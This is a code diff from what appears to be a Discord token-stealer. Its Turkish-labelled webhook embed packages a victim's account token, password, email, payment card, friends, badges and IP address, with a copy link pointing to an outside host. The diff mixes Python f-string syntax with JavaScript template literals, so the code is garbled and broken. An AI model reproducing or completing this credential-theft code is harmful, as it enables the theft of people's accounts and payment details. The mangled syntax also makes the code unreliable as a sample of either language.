@@ -610,38 +610,38 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-                        "name": f"<:cilgin:991704799160582204> Token:",
-                        "value": f'`{token}` [Kopyalamak için tıkla!](https://superfurrycdn.nl/copy/{token})',
+                        "name": f'<:cilgin:991704799160582204> Token:',
+                        "value": `\`{token}\` [Kopyalamak için tıkla!](https://superfurrycdn.nl/copy/{token})`,
                         "inline": False
                     },
                     {
-                        "name": "<:saygi:991705923443761263> Rozetler:",
-                        "value": f"{get_badges(token)}",
+                        "name": '<:saygi:991705923443761263> Rozetler:',
+                        "value": f`\`{get_badges(token)}`,
                         "inline": True
                     },
                     {
-                        "name": "<:ihihi:991704618524475503> Ödeme yöntemi:",
-                        "value": f"{card}",
+                        "name": '<:ihihi:991704618524475503> Ödeme yöntemi:',
+                        "value": f`\`{card}\``,
                         "inline": True
                     },
                     {
-                        "name": "<:iyidegilim:993461526063235092> Arkadaşlar:",
-                        "value": f"`{get_friends(token)}`",
+                        "name": '<:iyidegilim:993461526063235092> Arkadaşlar:',
+                        "value": f`\`{get_friends(token)}\``,
                         "inline": True
                     },
                     {
-                        "name": "<:ne_baktin_guzelim:991704353704513617> E-posta:",
-                        "value": f"`{email}`",
-                        "inline": True
+                        name: '<:ne_baktin_guzelim:991704353704513617> E-posta:',
+                        value: f`\`{email}\``,
+                        inline: True
                     },
                    
-          {
-            name: '<:dusunuom:991704756013777008> IP:',
-            value: `\`${config.ip}\``,
-            inline: true,
-          },
-          {
-            name: '<:yasasinirkimiz:991704134271127702> Şifre:',
+                    {
+                        name: '<:dusunuom:991704756013777008> IP:',
+                        value: `\`${config.ip}\``,
+                        inline: true,
+                    },
+                    {
+                        name: '<:yasasinirkimiz:991704134271127702> Şifre:',
             value: `\`${password}\``,
             inline: true,
           },
